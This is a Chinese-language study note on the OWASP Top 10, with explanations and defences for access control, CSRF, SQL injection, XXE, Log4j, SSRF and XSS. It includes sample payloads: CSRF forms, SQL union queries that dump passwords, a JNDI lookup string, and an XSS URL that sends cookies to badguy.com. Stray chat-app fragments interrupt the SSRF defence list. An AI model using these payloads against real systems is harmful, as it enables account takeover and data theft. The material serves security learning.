# OWASP TOP 10 #

> [owasp top10](https://owasp.org/Top10/)

## 失效的访问控制 (Broken Access Control) ##

> [OWASP Top 10(2021标准)-学习](https://www.cnblogs.com/Hekeats-L/p/17955621)

目标网站的某些页面可能受到保护，从而不允许普通访问者对相关页面进行访问，如果目标网站的普通访问者能够访问他们无权查看的受保护页面，那么就代表目标站点的访问控制正处于失效状态。如此，普通访问者就**能够查看目标网站上其他用户的敏感信息、能够访问目标网站中未经授权的功能**

失效的访问控制将**允许攻击者绕过授权**（即发生越权操作），查看敏感数据或执行未授权操作

### 不安全的直接对象引用 (IDOR) ###

指存在访问控制漏洞，我们可以通过该漏洞访问我们通常看不到的资源，这里的引用是指引用服务器内特定对象的标识符可以是文件、用户、银行应用程序中的银行帐户等，如 `https://bank.thm/account?id=111111`可以通过修改id访问其他用户


### 也叫做越权漏洞 ###

> [Web越权漏洞](https://zhuanlan.zhihu.com/p/689476548)

水平越权：攻击者尝试访问与其拥有相同权限的用户资源

垂直越权：攻击者尝试访问管理员权限的数据，只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的

Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果其中缺乏权限校验，可能导致越权。

1. 通过隐藏的URL：实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。
2. 直接引用对象：通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。
3. 多阶段功能：多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。
4. 静态文件：很多网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。
5. 配置错误：一些程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。

**防范措施**

1. 前后端同时对用户输入信息进行校验，双重验证机制
2. 执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
3. 特别敏感操作可以让用户再次输入密码或其他的验证信息。
4. 可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息。
5. 直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
6. 永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤


### 跨站请求伪造 (CSRF) ###

> [CSRF详解](https://juejin.cn/post/7008171429845811207)

定义：冒用COokie中的信息，发起请求攻击。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据，整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。

**攻击过程**

1. 用户成功登录一个网站
2. 诱导用户进入第三方网站（钓鱼网站）
3. 跳转过去了自动提交表单，冒用受害者信息
4. 后台正常走逻辑，将用户提交的表单信息进行处理

**CSRF攻击类型**

GET类型

	<!DOCTYPE html>
	<html>
	  <body>
	    <h1>黑客的站点</h1>
	    <img src="https://www.bank.com/withdraw?amount=1000?for=hacker">
	  </body>
	</html>
	​
	黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 就被转移到黑客的账户上去了。

POST类型

	<form action="http://bank.com/withdraw" method=POST>
	    <input type="hidden" name="account" value="xiaoming" />
	    <input type="hidden" name="amount" value="10000" />
	    <input type="hidden" name="for" value="hacker" />
	</form>
	<script> document.forms[0].submit(); </script> 
	访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。
​
引诱用户点击（a标签）​

	链接类型的CSRF a标签
	<a href="http://bank.com/withdraw?amount=1000&for=hacker" taget="_blank">重磅消息！！<a/>
	只要用户点击了，就会被攻击成功

**触发必要条件**

1. 目标站点有CSRF漏洞
2. 用户登陆过目标站点并保持登录状态
3. 用户点开第三方站点

**防护策略**

> [如何防止CSRF攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)

1. 阻止不明外域的访问
	1. 同源检测，请求头中的Origin Header和Referer Header，浏览器请求时自动附带的，不能有前端自定义，服务器解析确定请求的来源域
	2. 如果Origin存在，可以直接确定来源域名，但是两种情况不存在:IE11同源策略不会添加Origin标头,因为IE11对同源的定义和其他浏览器不同;IE_Exceptions 302重定向也不包含Origin标头,因为其可能会被认为是其他来源的敏感信息,对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上
	3. Http协议中有Referer字段,记录请求的来源地址.对于Ajax请求,图片和script等资源请求,Referer为发起请求的页面地址;对于页面跳转,Referer为打开页面历史记录的前一个页面地址.服务器优先判断Origin,如果没有才会使用Referer.
	4. Samesite Cookie:Google草案改进HTTP协议,增加Samesite属性,标识同站Cookie,不能作为第三方Cookie.Samesite有三个属性:Strict(任何情况都不能作为第三方Cookie),Lax(宽松模式,改变了当前页面或打开了新页面,同时是GET请求,这个Cookie可以作为第三方,新打开一个标签进入，或者跳转到子域名的网站,不需要重新登录)
2. 提交时要求附加本域才能获取信息
	1. 要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token/cookie
	2. Token：存在本地local strage中的加密数据,主流方案,页面加载时再每个a标签和form标签放入Token,服务器验证是否则是否正确,复杂且工作量大
	3. 双重Cookie验证:利用CSRF攻击不能获取到用户Cookie的特点，要求Ajax和表单请求携带一个Cookie中的值.提交前先读取用于验证的cookie值加入到提交字段。这样就形成了双提交（验证字段有两份，一份在cookie中，一份在POST或URL中）。显然单纯的csrf只能让请求中带有cookie但是并不能读取cookie加入到POST或URL中。优点:实施成本低,缺点:Cookie中增加了额外字段,可以通过XSS注入COokie,防御失效.
3. 后端接口防止XSRF
	1. 严格管理上传接口,防止上传预期之外的内容(HTML)
	2. 添加Header X-Content-Type-Options: nosniff 防止黑客上传HTML内容的资源（例如图片）被解析为网页
	3. 对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接
4. 前端提示
	1. 当前用户打开其他用户填写的链接时，需告知风险（知乎跳转外链，等等都会告知风险）
5. 个人用户
	1. 使用网页版邮件的浏览邮件或者新闻也会带来额外的风险
	2. 尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器


## 加密机制失效 (Cryptographic Failures) ##

> [OWASP TOP 10 2021](https://leqing.online/security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/)

加密机制保证机密性,加密机制失效是指因误用(或缺乏使用)保护敏感信息的加密算法而产生的漏洞

首先要确认对传输中的数据和存储数据都有哪些保护需求。例如：密码、信用卡号、医疗记录、个人信息和商业秘密需要额外保护。 对于数据，要确认：

1. 在传输数据过程中是否使用**明文传输**？这和传输协议有关：HTTP、SMTP、经过 TLS 升级的 FTP。外部网络流量是有害的，需要验证所有的内部通信
2. 无论是在默认情况还是在旧的代码中，是否还在使用任何**旧或者脆弱的加密算法或传输协议**
3. 是否默认使用加密密钥、生成或重复使用脆弱的加密密钥，或者是否缺少适当的密钥管理或密钥回转
4. 接收到的**服务器证书**和信任链是否经过正确验证

**如何防范**

1. 对应用程序处理、存储或者传输的数据分类，并根据相关要求确认哪些数据敏感
2. 对于没有必要存储的敏感数据，应当尽快清除
3. 确保加密存储所有的敏感数据
4. 确保使用了最新的，强大的标准算法、协议和密钥，并且密钥管理到位
5. 禁用缓存对包含敏感数据的响应
6. 不要使用传统协议 HTTP、FTP 等来传输敏感数据

## 注入 (Injection) ##

**SQL注入**：当用户控制的输入数据能够被传递为后端的SQL查询时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为(访问、修改、删除数据库中的信息)并获取到相关的查询结果(例如个人详细信息、用户登录凭据等)。

**命令注入**：当用户的输入能够被传递为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在Web应用程序的服务器上执行任意系统命令，从而允许他们访问用户的计算机系统。

### SQL注入 ###

**危害**

1. **猜解后台数据库**，这是利用最多的方式，盗取网站的敏感信息。
2. **绕过认证**，列如绕过验证登录网站后台。
3. 注入可以借助数据库的存储过程进行**提权**等操作

**猜解后台数据库**

字段:
	SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#`;(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误),当使用order by 3报错时,说明只有两个字段

union select联合查询继续获取信息:
	
union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同
	
	SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),user()#`; database()将会返回当前网站所使用的数据库名字. user()将会返回执行当前查询的用户名.

	SELECT first_name, last_name FROM users WHERE user_id = '1' union select version(),@@version_compile_os#`; version() 获取当前数据库版本. @@version_compile_os 获取当前操作系统。
	
	SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#`; information_schema数据库记录了数据库名,表,数据类型,访问权限等.其中的talbes表记录了表明和表明所在的数据库

	SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from users#`; 从users表用户名、密码

**绕过认证**

登录功能实际执行的SQL语句
	
	select * from users where username='123' and password='123'

构造:

	select * from users where username='123' or 1=1 #' and password='123' or 1=1 #' 判断语句 or 1=1 恒成立，所以结果当然返回真
	
或

	select * from users where username='123' or '1'='1' and password='123' or '1'='1
	

### 寻找SQL注入点 ###

**单引号判断法**:在参数后面添加单引号,如果页面返回错误,则存在 Sql 注入,原因是无论字符型还是整型都会因为单引号个数不匹配而报错;未报错也不能说明不存在,可能对单引号做了过滤

	http://xxx/abc.php?id=1'

**注入类型**:数字型,字符型,由创建表时本身的类型产生

**数字型判断**

	select * from <表名> where id = x 

当输入的参数x未整形时,使用 and 1=1 和 and 1=2 进行判断:

1. Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步。
2. Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。

如果是数字型,实际执行的SQL如下,两者都没有语法错误,前者逻辑判断正确返回正常,后者逻辑判断错误返回错误

	select * from <表名> where id = x and 1=1 
	select * from <表名> where id = x and 1=2 

而如果是字符型,则不会出现一个正常一个错误的响应,因为被翻译为

	select * from <表名> where id = 'x and 1=1' 
	select * from <表名> where id = 'x and 1=2' 
	

**字符型判断**

	select * from <表名> where id = 'x'

当输入的参 x 为字符型时,使用 and '1'='1 和 and '1'='2 来判断:

1. Url 地址中输入 http://xxx/abc.php?id= x' and '1'='1 页面运行正常，继续进行下一步。
2. Url 地址中继续输入 http://xxx/abc.php?id= x' and '1'='2 页面运行错误，则说明此 Sql 注入为字符型注入。

如果为字符型,实际执行的SQL如下,两者都没有语法错误,前者逻辑判断正确返回正常,后者逻辑判断错误返回错误

	select * from <表名> where id = 'x' and '1'='1'
	select * from <表名> where id = 'x' and '1'='2'

### 防御手段 ###

**使用允许列表(白名单)**：当用户提供的输入被发送到服务器时，此输入将会与安全输入或安全字符列表进行比较；如果用户所提供的输入数据被标记为安全的，那么它将被允许通过并由服务器进行正常处理，否则，用户所提供的输入数据将被拒绝通过，并且应用程序会抛出错误提示。

**过滤用户所输入的数据**：如果用户所提供的输入中包含某些危险字符，那么Web应用程序会先将这些危险字符清除，然后再继续让服务器进行处理。

## 不安全的设计 (Insecure Design) ##

指应用**程序框架**本身所固有的漏洞,不是关于错误实现或配置的漏洞,而是整个应用程序(或一部分)背后的**设计思想**从一开始就存在缺陷,即存在不适当的威胁建模.如开发人员围绕代码添加一些“快捷功能”以使得他们测试起来更加容易,并发布到生产环境.如开发阶段金庸OTP验证,以便快速测试应用程序其他部分,而无需在每次登录时手动输入代码,但如果开发人员在将该应用程序发布到生产环境时忘记重新启用OTP验证.

真实案例:Instagram使用验证码重置密码,设置了暴力破解的速率限制,尝试250次后用户被禁止,但是此限制仅限与一个IP地址,依然可以使用多个IP进行破解.

## 安全配置错误 (Security Misconfiguration) ##

指发生在本可以适当配置但却没有进行很好地配置的情况下,即使我们已经下载了最新的软件,但是不良的配置也可能使得我们已安装的程序容易受到攻击,常见的包括:

1. 云服务的权限配置不当,如S3存储桶
2. 启用了不必要的功能,如某些服务,页面,权限等
3. 是用来未更改的默认密码的账户
4. 报错信息过于详细,攻击正容易找到更多信息
5. 没有使用HTTP安全标头

 XML 外部实体注入（XXE）类别现在也被合并为该类别

### 如何防范 ###

1. 应实施安全的安装过程，包括一个可以快速部且易于署在另一个锁定环境的**可重复的加固过程**
2. 开发、质量保证和生产环境都应该进行**相同配置**，并且在每个环境中使用**不同的密码**
3. 这个过程应该是**自动化**的，以尽量减少安装一个新安全环境的消耗
4. 搭建**最小化平台**，该平台不包含任何不必要的功能、组件、文档和实例
5. 移除或不安装**不适用的功能和框架**
6. 检查和修复安全配置来**适应最新的安全说明、更新和补丁**，并将作为更新管理过程的一部分
7. 一个能在组件和用户间提供有效的分离和安全性的**分段**应用程序架构

## 易受攻击和过时的组件 (Vulnerable and Outdated Components) ##

指正在使用具有众所周知的、已公开的漏洞的应用程序

### 如何防范 ###

1. 移除不使用的依赖、不需要的功能、组件、文件和文档
2. 仅从官方渠道安全的获取组件，并使用前面机制来降低组件被篡改或加入恶意漏洞的风险
3. 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，就考虑部署虚拟补丁来监控、检查或保护

## 身份识别和身份验证错误 (Identification and Authentication Failures) ##

身份验证允许用户通过验证其身份来访问Web应用程序，最常见的身份验证形式是使用用户名和密码机制；用户需要输入密码凭据，然后服务器将验证它是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的本地浏览器提供一个会话cookie

身份验证机制的缺陷：

1. 暴力破解攻击
2. 使用弱凭证（弱口令）
3. 弱会话Cookie（可预测） 

缓解措施:

1. 多次失败尝试后自动锁定
2. 使用强密码
3. 多重身份认证

## 软件和数据完整性故障 (Software and Data Integrity Failures) ##

完整性：能够确定一段数据未被修改的能力

数据编码或序列化到一个对攻击者可读写的结构中将会导致不安全的反序列化，另一种是应用程序依赖于不受信任的来源。

不安全的持续性整合/部署(CI/CD)流程则会造成潜在的未经授权存取，恶意程式码或系统破坏。

最后，现在许多应用程式拥有自动更新功能，但自动更新功能在缺乏充足完整性验证功能时就下载并安装更新到处于安全状态下的应用程式。攻击者能上传自制更新档案，更新档案将传播到所有已安装之应用程式并在这些应用程式上执行。 确保不受信任之客户端不会收到未签署或加密之序列化资料并利用完整性检查或数位签章来侦测窜改或重放攻击。

### 如何防范 ###

1. 使用**数字签名**或类似机制来验证软件或数据来自预期来源，且未被修改。
2. 确保库和依赖项目，如: npm 或 Maven，正在使用**受信任的存储库**。如果您的风险较高，请考虑托管一个经过审核的、内部已知合格的存储库。
3. 确保使用**软件供应链安全工具**(如:OWASP Dependency Check 或 OWASP CycloneDX)来验证组件不包含已知漏洞。
4. 确保对代码和配置更改进行**审核**，以最大限度地减少恶意代码或配置引入软件管道的可能性。
5. 确保您的 CI/CD 管道具有适当的隔离、配置和访问控制，以确保代码在构建和部署过程中的完整性。确保通过特定形式的完整性检查或数字签名来检测序列
6. 数据是否存在**篡改或重播**，所有未签名或未加密的序列化数据不会发送到不受信任的客户端。

## 安全日志和监控故障 (Security Logging & Monitoring Failures) ##

此类别旨在帮助检测、升级和应对主动违规行为。没有日志记录和监控，就无法检测到违规行为，无法判断攻击者在获得对特定Web应用程序的访问权限之后，具体执行了哪些操作

安全日志文件中所存储的信息应包括：HTTP status codes（HTTP状态码）、Time Stamps（时间戳）、Usernames（用户名）、API endpoints/page locations（API端点/页面位置）、IP addresses（IP地址）

在发生网络安全违规或事件后，日志记录会变得尤为重要。理想的情况是：目标应用程序能够进行监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时(例如，在攻击者入侵十天之后才检测到)尽可能地减少攻击者所造成的影响。

1. 针对特定操作进行**多次未经授权的尝试**：通常是身份验证尝试或者访问未经授权的资源(例如管理员页面)。
2. 来自**异常 IP 地址**或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户(针对该活动的检测具有一定误报率)。
3. 使用了**自动化工具**：特定的自动化工具可以很容易地被识别到，例如，检测用户所使用的User-Agent标头的值或用户发送请求的速率，出现这些特征可能表明攻击者正在使用自动化攻击工具。
4. 使用了**常见的有效载荷**(Payload)：在W可eb应用程序中，攻击者能会使用一系列已知的有效载荷，通过检测这些有效载荷的使用情况，就可以得知是否有人在对目标应用程序进行未经授权或恶意的测试。

### 如何预防 ###

1. 确保所有登录、访问控制和服务器端输入验证失败都可以记录足够的用户上下文来识别可疑或恶意帐户，并保存足够长的时间以进行延迟取证分析
2. 确保日志以日志管理解决方案可以轻松使用的格式生成
3. 确保日志数据正确编码，以防止对日志或监控系统的注入或攻击
4. 确保高价值交易具有具有完整性控制的审计跟踪，以防止篡改或删除，例如仅附加数据库表或类似内容
5. 建立有效的监控和警报，以便快速检测和应对可疑活动
6. 建立或采用事件响应和恢复计划

### Log4J2 ###

> [Log4J2漏洞](https://blog.csdn.net/FisrtBqy/article/details/130680143)

2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。漏洞适用版本：2.0 <= Apache log4j2 <= 2.14.1

- Log4j为了输出日志时能输出任意位置的Java对象，引入了Lookup接口，这个Lookup接口可以看作是JNDI的一种实现，允许按照具体的名称逻辑查找对象的位置，并输出对象的内容，此对象可以通过Java的序列化或反序列化传输，从远程服务器上查找。
- 由于Lookup接口的原因，Log4j就暗含JNDI注入漏洞，可以联合使用JNDI+LDAP或者JNDI+RMI通过命名功能直接从远程服务器上调用文件并在本地执行。
- Log4j在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j的漏洞。
- LDAP(Ligntweight Directory Access Protocol)，轻量级目录访问协议，既是一种服务，也是一种协议，是JNDI的一种底层实现，主要功能是提供命名关键字到对象的映射目录，开发人员可以通过输入名称，获取到对象的内容。简单来说，就是搜索功能，它是分布式的，允许从远程服务器上面加载获取对象。默认服务端口389.
- Java Naming and Directory Interface，JAVA命名和目录接口（命名服务接口），应用通过该接口与具体的目录服务进行交互，允许通过名称发现和查找数据或对象，可用于动态加载配置等
- JNDI注入流程：攻击者生成一个恶意的类文件，上传到一个为攻击者服务的HTTP服务器，向目标服务器（靶机，运行了LDAP服务，并指定了恶意类文件所在的地址）给HTTP请求中向Java应用程序传入恶意参数(比如${jndi:ldap://xxx.com:1234/xxx})，指向的是LDAP服务器不存在的资源，当JNDI接口使用lookup查找时，发现在参数指定的LDAP服务器中找不到，于是根据LDAP服务器预设的地址自动从存有恶意类文件的HTTP服务器动态加载对象。
- RMI协议：JAVA的一种远程接口调用协议，在TCP协议上传递可序列化的Java对象，即可以实现调用远程方法和调用本地方法一样简单。

## 服务器请求伪造 (Server-Side Request Forgery (SSRF)) ##

指攻击者能够强制Web应用程序代表其向任意目标发送请求的情况下，同时攻击者还可以**控制请求本身的内容**，SSRF漏洞通常出现在需要使用第三方服务的Web应用程序的具体实现中。

**攻击的对象是从外网无法访问得内部系统，服务器端提供了从其他服务器获取数据的功能且没有对目标地址进行过滤，使用web应用作为代理去攻击远程和本地的服务器**

考虑一个使用外部API向其客户端发送SMS通知的Web应用程序。对于每封电子邮件，网站都需要向SMS提供商的服务器发出Web请求，以便发送想要发送的消息内容。由于SMS服务提供商是按每条消息计费的，因此他们会要求你在向其API发出的每个请求中添加一个他们预先分配给你的密钥；这个API密钥将充当身份验证令牌，使得SMS服务提供商能够知道要向哪个用户计费每条消息。应用程序向用户**公开了server参数**，该参数定义了SMS服务提供商的服务器名称；如果攻击者愿意，他们就可以通过简单地修改server值以指向由其所控制的计算机设备，然后Web应用程序就会将SMS请求转发给攻击者而不是SMS服务提供商。作为被转发的消息的一部分，攻击者还能获取到API密钥，从而允许他们使用SMS服务发送消息，而费用则由网站所有者承担。

攻击者将server参数设置为自身

	https://www.mysite.com/sms?server=attacker.thm&msg=ABC

存在SSRF漏洞的Web应用程序自动发送以下请求：

	https://attacker.thm/api/send?msg=ABC

可以用于：

1. 枚举内部网络，包括IP地址和端口等信息；
2. 滥用服务器之间的信任关系，并获取对其他受限服务的访问权限；
3. 与一些非HTTP服务交互以实现远程代码执行(RCE)
4. 目标网站本地敏感数据的读取
5. 内外网主机应用程序或漏洞的利用

### 如何防范 ###

1. 过滤返回的信息，如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
swiftie

8
我还没去过重庆

已读
我之后要去重庆上课
2. 统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。
3. 限制请求的端口，比如 80,443,8080,8090。
4. 禁止不常用的协议，仅仅允许 http 和 https 请求。可以防止类似于 file:///,gopher://,ftp://等引起的问题。
5. 使用 DNS 缓存或者 Host 白名单的方式。


## XML外部实体 (XML External Entities) ##

XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 DoS 攻击等危害。

防止 XXE 的最安全方法始终是完全禁用 DTD（外部实体）

	<?xml version="1.0" encoding="UTF-8"?>   //xml的声明
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file://d:/1.txt" >
	]>                                      //DTD部分
	<x>&xxe;</x>                          //xml部分

DTD 的部分，意思是读取 d 盘上的 1.txt 文件，当然如果是读取用户密码呢？或者也可以进行更多其他的危险操作。

## 跨站脚本攻击 (Cross-Site Scripting) ##

> [跨站脚本攻击](https://leqing.online/security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a07-cross-site-scriptingxss)

由于 WEB 应用程序**对用户的输入过滤不足**而产生的。攻击者利用网站漏洞把**恶意的脚本代码注

分为三类：反射型XSS（后端）、DOM XSS（前端）、持久型XSS

### 反射型 XSS ###

服务端的代码存在 XSS 漏洞

	<?php
	// Is there any input?
	if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
	    // Feedback for end user
	    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
	}
	?>

该代码直接从 url 参数中获取 name 字段，但如果 name 字段是精心构造的攻击代码呢？就很容易攻击者利用。

因此，攻击者可以精心构造攻击 URL，但仍然需要**用户点击**该 URL 才行，因此通常来说攻击者通过**电子邮件**等方式给别人发送**带有恶意脚本代码参数的 URL**，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。

### DOM XSS ###

DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据。

例如: http://victim.com/search.asp?term=apple
	
	<html>
	  　　<title
	  ></title>
	  　　
	  <body>
	    　　　　Results for <%Reequest.QueryString("term")%> 　　　　... 　　
	  </body>
	</html>

Tom 先建立一个网站http://badguy.com, 用来接收“偷”来的信息。 然后 Tom 构造一个恶意的 url(如下), 通过某种方式(邮件，QQ)发给 Monica
	
	http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>

Monica 点击了这个 URL， 嵌入在 URL 中的恶意 Javascript 代码就会在 Monica 的浏览器中执行。 那么 Monica 在 victim.com 网站的 cookie, 就会被发送到 badguy 网站中。这样 Monica 在 victim.com 的信息就被 Tom 盗了。

### 持久型 XSS ###

又称存储型，该类型是应用广泛而且有可能影响大 Web 服务器自身安全的漏洞，攻击者将攻击脚本上传到 Web 服务器上，使得所有访问该页面的用户都面临信息泄露的可能。 攻击过程如下

Alex 发现了网站 A 上有一个 XSS 漏洞，该漏洞允许将攻击代码保存在数据库中，

Alex 发布了一篇文章，文章中嵌入了恶意 JavaScript 代码。

其他人如 Monica 访问这片文章的时候，嵌入在文章中的恶意 Javascript 代码就会在 Monica 的浏览器中执行，其会话 cookie 或者其他信息将被 Alex 盗走。

Dom-Based XSS 漏洞威胁用户个体，而存储式 XSS 漏洞所威胁的对象将是大量的用户。

### XSS 的防御 ###

**对输入进行过滤，对输出进行编码**

httpOnly：在 cookie 中设置 HttpOnly 属性后，js 脚本将无法读取到 cookie 信息（例如 document.cookie）。

对数据进行 Html Encode 处理，即转义 HTML，对 url 中的引号，尖括号，斜杠进行转义。例如：htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。

HTML Encode：XSS 之所以会发生， 是因为用户输入的数据变成了代码。 所以我们需要对用户输入的数据进行 HTML Encode 处理。 将其中的"中括号"， “单引号”，“引号” 之类的特殊字符进行编码。

URL Encode：URL 编码是为了符合 url 的规范。因为在标准的 url 规范中中文和很多的字符是不允许出现在 url 中的。

黑名单

过滤 或移除特殊的 Html 标签， 例如: